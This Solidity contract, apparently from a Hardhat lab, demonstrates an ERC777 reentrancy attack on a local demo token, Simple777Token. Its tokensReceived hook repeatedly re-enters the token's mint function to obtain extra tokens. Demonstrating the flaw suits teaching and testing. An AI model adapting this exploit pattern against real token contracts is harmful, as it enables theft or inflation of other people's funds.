// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.4.20;


import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";

import "hardhat/console.sol";

import "./Simple777Token.sol";


contract Attack777 is IERC777Sender, ERC1820Implementer, IERC777Recipient {

    bytes32 constant public TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");

    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    Simple777Token private _token;

    address att = address(this);

    uint i = 0;

    event DoneStuff(address operator, address from, address to, uint256 amount, bytes userData, bytes operatorData);

    constructor (address token) {
        _token = Simple777Token(token);

        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));

        console.log("attack constructor -- token contract address: %s , Recipient contract address: %s", token, address(this));
        // console.log("TOKENS_RECIPIENT_INTERFACE_HASH: %s", TOKENS_RECIPIENT_INTERFACE_HASH);
    }

    function senderFor(address account) public {
        _registerInterfaceForAddress(TOKENS_SENDER_INTERFACE_HASH, account);
    }

    function attack() public {
        _token.mint(address(att), 300, "", "");
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // do stuff
        emit DoneStuff(operator, from, to, amount, userData, operatorData);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        require(msg.sender == address(_token), "Simple777Recipient: Invalid token");

        if (i<=5){
            i ++;
            console.log("Reentered");
            _token.mint(address(att), 300, "", "");  //在这里重入
        }

        console.log("DoneStuff event");
        // console.log("$s $s $s $o $s $s", operator, from, to, amount, userData, operatorData);
        emit DoneStuff(operator, from, to, amount, userData, operatorData);
    }
}
